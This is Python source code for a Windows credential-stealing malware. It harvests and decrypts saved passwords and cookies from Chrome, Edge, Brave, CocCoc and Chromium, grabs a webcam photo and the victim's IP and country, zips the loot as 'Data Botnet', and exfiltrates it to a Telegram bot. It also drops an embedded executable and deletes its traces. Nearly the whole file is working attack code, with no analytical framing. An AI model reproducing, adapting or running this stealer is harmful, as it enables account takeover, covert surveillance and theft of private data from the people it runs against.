idbot = '' token = '' exe = 'BASE64_ENCODED_EXE' import os import shutil import sqlite3 import json import base64 from Cryptodome.Cipher import AES import win32crypt import requests from aiogram import Bot import asyncio import subprocess import cv2 path_data = 'C:\\Users\\Public\\Document' try:os.mkdir(path_data) except:pass try:os.mkdir(path_data+'\\Cookie') except:pass try:os.mkdir(path_data+'\\Password') except:pass try:os.mkdir(path_data+'\\Log') except:pass def check_chrome_running(): for proc in os.popen('tasklist').readlines(): if 'chrome.exe' in proc: subprocess.run('taskkill /f /im chrome.exe', shell=True) def infor(): response = requests.get('https://ipconfig.io/json') data = response.json() return data def find_profile(data_path): profile=[] profile.append('Default') try: objects = os.listdir(data_path) files_dir = [f for f in objects if os.path.isdir(os.path.join(data_path, f))] for folder in files_dir: text = folder.split() if(text[0] == 'Profile'): profile.append(folder) return profile except:pass def browser(): a = [ { 'name': 'Google', 'path': os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"), 'profile': find_profile(os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")) }, { 'name': 'CocCoc', 'path': os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"), 'profile': find_profile(os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data")) }, { 'name': 'Edge', 'path': os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"), 'profile': find_profile(os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")) }, { 'name': 'Brave', 'path': os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"), 'profile': find_profile(os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")) }, { 'name': 'Chromium', 'path': os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "Chromium", "User Data"), 'profile': find_profile(os.path.join(os.environ [ "USERPROFILE"], "AppData", "Local", "Chromium", "User Data")) }, ] return a def getSecretKey(path1): try: path = os.path.normpath(path1 + "\\Local State") with open(path, "r", encoding='utf-8') as f: local_state = f.read() local_state = json.loads(local_state) secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) secret_key = secret_key[5:] secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1] return secret_key except: pass #Decrypt def decryptPayload(cipher, payload): return cipher.decrypt(payload) def generateCipher(aes_key, iv): return AES.new(aes_key, AES.MODE_GCM, iv) def decryptPassword(ciphertext, secret_key): try: initialisation_vector = ciphertext[3:15] encrypted_password = ciphertext[15:-16] cipher = generateCipher(secret_key, initialisation_vector) decrypted_pass = decryptPayload(cipher, encrypted_password) decrypted_pass = decrypted_pass.decode() return decrypted_pass except: pass def start1(): bc = browser() cookie = [] for bs in bc: if os.path.exists(bs['path']): for profile in bs['profile']: try: if os.path.exists(os.path.join(bs['path'], profile, 'Network', 'Cookies')): shutil.copyfile(os.path.join(bs['path'], profile, 'Network', 'Cookies'), os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile )) cookie.append({'path':os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile ),'pathkey':bs['path'],'name':bs['name'],'profile':profile}) except:pass else: pass return cookie def start2(): bc = browser() password = [] for bs in bc: if os.path.exists(bs['path']): for profile in bs['profile']: try: if os.path.exists(os.path.join(bs['path'], profile, 'Login Data')): shutil.copyfile(os.path.join(bs['path'], profile, 'Login Data'), os.path.join(path_data, 'Log','Login '+bs['name']+' '+profile )) password.append({'path':os.path.join(path_data, 'Log','Login '+bs['name']+' '+profile),'pathkey':bs['path'],'name':bs['name'],'profile':profile}) except:pass else: pass return password def extract(): datacookie = start1() for row in datacookie: c = sqlite3.connect(row['path']) cursor = c.cursor() select_statement = 'SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc FROM cookies' cursor.execute(select_statement) bc = cursor.fetchall() data1 = [] for user in bc: if user[4] == 1 : httponly = "TRUE" else:httponly = "FALSE" if user[5] == 1 : secure = "TRUE" else:secure = "FALSE" value = decryptPassword(user[3], getSecretKey(row['pathkey'])) cookie = f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n" data1.append(cookie) with open(os.path.join(path_data,'Cookie',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f: for line in data1: f.write(line) datapassword = start2() for row in datapassword: c = sqlite3.connect(row['path']) cursor = c.cursor() select_statement = 'SELECT action_url, username_value, password_value FROM logins' cursor.execute(select_statement) login_data = cursor.fetchall() data2 = [] for userdatacombo in login_data: if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != "" and userdatacombo[2] != "" and userdatacombo[0] != "": password = decryptPassword(userdatacombo[2], getSecretKey(row['pathkey'])) data = "**************************************************\nURL: " + userdatacombo[0] + " \nUsername: " + userdatacombo[1] + " \nPassword: " + str(password) data2.append(data) else: pass with open(os.path.join(path_data,'Password',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f: for line in data2: f.write(line + "\n") async def sendfile(TOKEN, ID, path,caption1): bot = Bot(token=TOKEN) with open(path, 'rb') as file: await bot.send_document(chat_id=ID, document=file, caption=caption1) await bot.close() def webcam(): try: camera = cv2.VideoCapture(0) return_value, image = camera.read() cv2.imwrite(path_data+ '\\webcam.png', image) except: pass def openexe(encoded_content): decoded_content = base64.b64decode(encoded_content) with open('C:\\Users\\Public\\setup.exe', 'wb') as file: file.write(decoded_content) # os.startfile('C:\\Users\\Public\\setup.exe') async def main(TOKEN, ID): try: openexe(exe) except:pass thongtin = infor() check_chrome_running() extract() webcam() name_f = 'Data Botnet' z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', path_data) caption = "IP: "+thongtin['ip']+"\nCountry: "+thongtin['country']+"" await sendfile(TOKEN, ID, z_ph, caption) shutil.rmtree(os.environ["TEMP"], name_f +'.zip');shutil.rmtree(os.environ["TEMP"], name_f) try: shutil.rmtree(path_data) except:pass if __name__ == '__main__': asyncio.run(main(token,idbot))
